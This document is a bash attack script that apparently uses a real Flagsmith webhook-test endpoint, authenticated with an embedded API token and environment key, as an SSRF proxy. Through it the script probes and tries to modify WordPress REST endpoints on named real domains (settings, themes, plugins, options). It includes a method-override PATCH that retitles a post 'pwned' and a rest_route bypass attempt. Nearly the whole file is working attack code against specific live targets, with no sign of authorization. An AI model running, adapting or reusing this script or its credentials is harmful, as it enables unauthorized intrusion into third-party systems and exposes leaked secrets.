#!/bin/bash
UA="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
KEY="e43b0d44b4b43efb28b21fef7bee5977203f0276"
EKEY="4kKuh8VekuYPrtpsJFg5mg"

SSRF() {
  curl -s -X POST "https://flagsmith.koinworks.com/api/v1/environments/${EKEY}/webhooks/test/" \
    -H "Authorization: Token $KEY" -H "Content-Type: application/json" -H "User-Agent: $UA" \
    -d "{\"url\":\"$1\"}" --max-time 25 2>/dev/null || echo "TO"
}

echo "IP: $(curl -s https://ifconfig.me)"

# Test 1: Verify — check if posts endpoint returns our created post
echo "=== VERIFY POSTS ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/posts?per_page=1&orderby=date&order=desc"
echo ""

# Test 2: Try to write to WP settings via REST
echo "=== WRITE SETTINGS ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/settings"
echo ""

# Test 3: Try to create/update themes
echo "=== THEMES ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/themes"
echo ""

# Test 4: Try to create/update plugins
echo "=== PLUGINS ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/plugins"
echo ""

# Test 5: WP REST API search — might confirm post exists
echo "=== SEARCH ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/search?search=test"
echo ""

# Test 6: Write to options — might allow arbitrary option modification
echo "=== OPTIONS ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/options"
echo ""

# Test 7: Try WP REST w/ _method override to send PUT/PATCH
echo "=== METHOD OVERRIDE ==="
SSRF "http://koinp2p.com/wp-json/wp/v2/posts/1?_method=PATCH&title=pwned"
echo ""

# Test 8: Try WP REST via rest_route query param (might bypass path-based restrictions)
echo "=== REST ROUTE SETTINGS ==="
SSRF "http://koinp2p.com/?rest_route=/wp/v2/settings"
echo ""
